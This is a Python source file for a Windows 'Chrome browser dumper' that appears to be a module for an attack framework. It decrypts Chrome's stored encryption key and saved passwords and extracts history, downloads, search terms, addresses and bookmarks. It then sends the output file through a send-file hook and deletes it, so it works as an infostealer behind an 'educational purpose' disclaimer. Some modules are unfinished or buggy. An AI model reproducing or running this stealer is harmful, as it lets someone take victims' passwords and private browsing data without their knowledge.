try:
    from Crypto.Cipher import AES
    import win32crypt
    import shutil
    import sqlite3
    import base64
    import json
    import os
    from datetime import timezone, datetime, timedelta
    import tempfile
    import sys
    import csv
except ModuleNotFoundError as e:
    print(f'[-] {str(e)}')

HELP = '''
NAME : Chrome BROWSER DUMPER
VERSION : 1.0.0
AUTHOR : ISSAC

THIS TOOL IS USE FOR EDUCATIONAL PURPOSE ONLY.
DO NOT USE IN ILLEGAL PURPOSE.

FUNCTION:
    DUMP CREDENTIALS - LOGIN USERNAME, PASSWORD, ETC.
    DUMP DOWNLOAD - EXTRACT DOWNLOAD RECORD.
    DUMP HISTORY - HAVE YOU EVER WATCH PORN...? 
    DUMP COOKIES - WARNING : NOT USABLE WHEN CHROMR IS RUNNING.
    DUMP CREDIT CARD - NOT TEST YET.
    DUMP ADDRESS - GET ADDRESS ALWAYS FILL IN ONLINE PAYMENT.
    DUMP CONTACT - GET CONTACT.
    DUMP SHORT CUTS - GET ALL SHORT CUTS.
    DUMP BOOKMARKS - EXTARCT ALL BOOKMARKS.

'''

CONFIG = None

def chrome_datetime(chrome_date):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

def write_txt(data):
    path = CONFIG['SavePath']['value']
    with open(path, 'a') as file:
        file.write(data)

def write_sqlite(data:dict):
    path = CONFIG['SavePath']['value']
    if not os.path.exists(path):
        conn = sqlite3.connect(path)
        cursor = conn.cursor()

        columns = [f'\'{str(key)}\'' for key in list(data.keys())]
        columns = ','.join(columns)
        sql = f'CREATE TABLE LOGINS({columns});'
        cursor.execute(sql)
    else:
        conn = sqlite3.connect(path)
        cursor = conn.cursor()

    val = [f'\'{str(v)}\'' for v in list(data.values())]
    val = ','.join(val)
    sql = f'INSERT INTO LOGINS({columns}) VALUES ({val});'
    print(sql)
    cursor.execute(sql)

    cursor.close()
    conn.close()

def write_csv(data:dict):
    path = CONFIG['SavePath']['value']
    with open(path, 'w', newline='') as csvfile:
        fields = [str(key) for key in list(data.keys())]
        writer = csv.DictWriter(csvfile, fields)
        if not os.path.exists(path):
            writer.writeheader()
        
        writer.writerow(data)

def data_handle(data:dict):
    save = CONFIG['SaveFile']['value']
    if save == 1:
        mode = CONFIG['SaveMode']['value']
        if mode == 0:
            for key in data.keys():
                write_txt(f'{key}: {data[key]}\n')
            write_txt('-' * 100 + '\n')
        elif mode == 1:
            write_sqlite(data)
        elif mode == 2:
            write_csv(data)
    else:
        for key in data.keys():
            print(f'{key}: {data[key]}')
            
        print('-' * 100)

class DumpCredentials:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def fetch_encryption_key(self):
        local_state = os.path.join(self.google_dir, 'Chrome', 'User Data', 'Local State')
        with open(local_state, 'r', encoding='utf-8') as file:
            local_state_data = file.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    def password_decryption(self, password, encryption_key):
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()


    def run(self):
        key = self.fetch_encryption_key()
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'Login Data')
        db_dir = os.path.dirname(db_path)
        filename = tempfile.mktemp('.db', db_dir)
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        sql_query = 'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used'
        cursor.execute(sql_query)

        print('-' * 100)
        for row in cursor.fetchall():
            main_url = row[0]
            login_url = row[1]
            user = row[2]
            decrypted_password = self.password_decryption(row[3], key)
            date_ctime = row[4]
            last_used = row[5]

            if date_ctime != 86400000000 and date_ctime:
                date_ctime = str(chrome_datetime(date_ctime))
            
            if last_used != 86400000000 and last_used:
                last_used = str(chrome_datetime(last_used))

            if user or decrypted_password:
                data = {
                    'Main URL' : main_url,
                    'Login URL' : login_url,
                    'Username' : user,
                    'Password' : decrypted_password,
                    'Create time' : date_ctime,
                    'Last used' : last_used,
                }

                data_handle(data)
            else:
                continue
        
        cursor.close()
        db.close()
    
        try:
            os.remove(filename)
        except:
            pass

class DumpDownloadRecord:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'History')
        db_dir = os.path.dirname(db_path)
        filename = tempfile.mktemp('.db', db_dir)
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        sql_query = 'select guid, target_path, start_time,received_bytes,total_bytes,end_time,last_access_time,tab_url,tab_referrer_url from downloads order by start_time'
        cursor.execute(sql_query)

        print('-' * 100)

        for row in cursor.fetchall():
            guid = row[0]
            target_path = row[1] # LOCAL SAVE PATH
            start_time = row[2]
            received_bytes = row[3]
            total_bytes = row[4]
            end_time = row[5]
            last_access_time = row[6]
            tab_url = row[7]
            tab_referrer_url = row[8]

            if start_time != 86400000000 and start_time:
                start_time = str(chrome_datetime(start_time))

            if end_time != 86400000000 and end_time:
                end_time = str(chrome_datetime(end_time))

            if last_access_time != 86400000000 and last_access_time:
                last_access_time = str(chrome_datetime(last_access_time))

            if guid or tab_url:
                data = {
                    'GUID' : guid,
                    'Tab URL' : tab_url,
                    'Tab ref URL' : tab_referrer_url,
                    'Target Path' : target_path,
                    'Received bytes' : received_bytes,
                    'Total bytes' : total_bytes,
                    'Start time' : start_time,
                    'End time' : end_time,
                    'Last access' : last_access_time,
                }

                data_handle(data)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

class DumpHistory:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'History')
        db_dir = os.path.dirname(db_path)
        filename = tempfile.mktemp('.db', db_dir)
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        sql_query = 'select id,url,title,visit_count,last_visit_time from urls order by last_visit_time'
        cursor.execute(sql_query)

        print('-' * 100)

        for row in cursor.fetchall():
            _id = row[0]
            url = row[1]
            title = row[2]
            visit_count = row[3]
            last_visit = row[4]

            if last_visit != 86400000000 and last_visit:
                last_visit = str(chrome_datetime(last_visit))

            if url or title:
                data = {
                    'ID' : _id,
                    'URL' : url,
                    'Title' : title,
                    'Visit time' : visit_count,
                }

                data_handle(data)

class DumpCookies:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
        db_dir = os.path.dirname(db_path)
        filename = tempfile.mktemp('.db', db_dir)
        try:
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()

            sql_query = ''
            cursor.execute(sql_query)

            for row in cursor.fetchall():
                pass
        except PermissionError as e: # CHROME IS RUNNING
            print(f'[-] {str(e)}')

class DumpSearchKeyword:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'History')
        db_dir = os.path.dirname(db_path)
        filename = tempfile.mktemp('.db', db_dir)
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        sql_query = 'select term from keyword_search_terms'
        cursor.execute(sql_query)

        result = []
        for row in cursor.fetchall():
            term = row[0]
            if term not in result:
                result.append(term)

        for term in result:
            data = {
                'Term' : term,
            }

            data_handle(data)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

class DumpCredCard:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'Web Data')

class DumpAddress:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'Web Data')
        db_dir = os.path.dirname(db_path)
        filename = tempfile.mktemp('.db', db_dir)
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        sql_query = 'select value from local_addresses_type_tokens'
        cursor.execute(sql_query)

        for row in cursor.fetchall():
            value = row[0]
            if value:
                data = {
                    'Local Address' : value,
                }

                data_handle(data)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

class DumpContact:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'Web Data')

class DumpShortCut:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        db_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'default', 'ShortCuts')
        db_dir = os.path.dirname(db_path)
        filename = tempfile.mktemp('.db', db_dir)
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        sql_query = 'select text,fill_into_edit,url,description,last_access_time from omni_box_shortcuts order by last_access_time'
        cursor.execute(sql_query)

        print('-' * 100)

        for row in cursor.fetchall():
            text = row[0]
            fill_into_edit = row[1]
            url = row[2]
            desc = row[3]
            last = row[4]

            if last != 86400000000 and last:
                last = str(chrome_datetime(last))

            if text:
                data = {
                    'Text' : text,
                    'File into edit' : fill_into_edit,
                    'URL' : url,
                    'Description' : desc,
                    'Last access' : last,
                }

                data_handle(data)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

class DumpBookmarks:
    def __init__(self, google_dir) -> None:
        self.google_dir = google_dir

    def run(self):
        json_path = os.path.join(self.google_dir, 'Chrome', 'User Data', 'Default', 'Bookmarks')
        json_dir = os.path.dirname(json_path)
        filename = tempfile.mktemp('.json', json_dir)
        shutil.copyfile(json_path, filename)
        with open(filename, 'r', encoding='utf-8') as f:
            json_data = dict(json.loads(f.read()))
        
        print('-' * 100)
        for d1 in json_data['roots']['bookmark_bar']['children']:
            name = d1['name']
            _type = d1['type']
                
            if _type == 'url':
                url = d1['url']
                date_added = int(d1['date_added'])
                date_last_used = int(d1['date_last_used'])
                last_visited_desktop = None
                if 'meta_info' in d1.keys() and 'last_visited_desktop' in d1['meta_info'].keys():
                    last_visited_desktop = int(d1['meta_info']['last_visited_desktop'])

                if date_added != 86400000000 and date_added:
                    date_added = str(chrome_datetime(date_added))

                if date_last_used != 86400000000 and date_last_used:
                    date_last_used = str(chrome_datetime(date_last_used))

                if last_visited_desktop != 86400000000 and last_visited_desktop:
                    last_visited_desktop = str(chrome_datetime(last_visited_desktop))

                print(f'Name: {name}')
                print(f'URL: {url}')

                data = {
                    'Name' : name,
                    'URL' : url,
                    'Date added' : date_added,
                    'Date Last used' : date_last_used,
                    'Last visited desktop' : last_visited_desktop,
                }

                data_handle(data)

        try:
            os.remove(filename)
        except:
            pass

class Module:
    def __init__(self) -> None:
        self.google_dir = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google')
        self.help = HELP
        self.send_file = None
        self.config = {
            'ChromePath' : {
                'value' : os.path.join(self.google_dir, 'Chrome', 'User Data', 'Local State'),
                'req' : 'yes',
                'help' : 'Chrome installation path.',
            },
            'Action' : {
                'value' : '0',
                'req' : 'yes',
                'help' : 'Dump action',
                'available' : {
                    '0' : 'Credentials(Password)',
                    '1' : 'Download record',
                    '2' : 'History',
                    '3' : 'Cookie, session',
                    '4' : 'Search keyword',
                    '5' : 'Credit card',
                    '6' : 'Address',
                    '7' : 'Contact',
                    '8' : 'ShortCuts',
                    '9' : 'Bookmarks',
                },
            },
            'Method' : {
                'value' : '0',
                'req' : 'yes',
                'help' : 'Dump method',
                'available' : {
                    '0' : 'Display data',
                    '1' : 'Save to txt',
                }
            },
            'SaveFile' : {
                'value' : '0',
                'req' : 'no',
                'help' : 'Save result into file if set',
            },
            'SaveMode' : {
                'value' : '0',
                'req' : 'no',
                'help' : 'Save result into differenet file extension',
                'available' : {
                    '0' : 'txt, text file',
                    '1' : 'db, sqlite file',
                    '2' : 'csv, table file',
                },
            },
            'SavePath' : {
                'value' : '',
                'req' : 'no',
                'help' : 'Save file path',
            }
        }

        g_dir = self.google_dir
        self.exploit = {
            0 : DumpCredentials(g_dir),
            1 : DumpDownloadRecord(g_dir),
            2 : DumpCookies(g_dir),
            3 : DumpHistory(g_dir),
            4 : DumpSearchKeyword(g_dir),
            5 : DumpCredCard(g_dir),
            6 : DumpAddress(g_dir),
            7 : DumpContact(g_dir),
            8 : DumpShortCut(g_dir),
            9 : DumpBookmarks(g_dir),
        }

    def check_val(self):
        pass

    def run(self):
        global CONFIG
        CONFIG = self.config
        action = self.config['Action']['value']
        if (type(action) == str):
            action = int(action)
        self.exploit[action].run()

        if self.config['SaveFile']['value'] == 1:
            path = self.config['SavePath']['value']
            if os.path.exists(path):
                print(f'[*] Send file: {path}')
                self.send_file(path)
                print(f'[+] File sent')
                print(f'[*] Remove output file.')
                os.remove(path)
                print(f'[+] Action successfully.')
            else:
                print(f'[-] Cannot find file: {path}')

if __name__ == '__main__':
    google_dir = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google')
    action = int(sys.argv[1])
    module = Module()
    module.config['Action']['value'] = action
    module.run()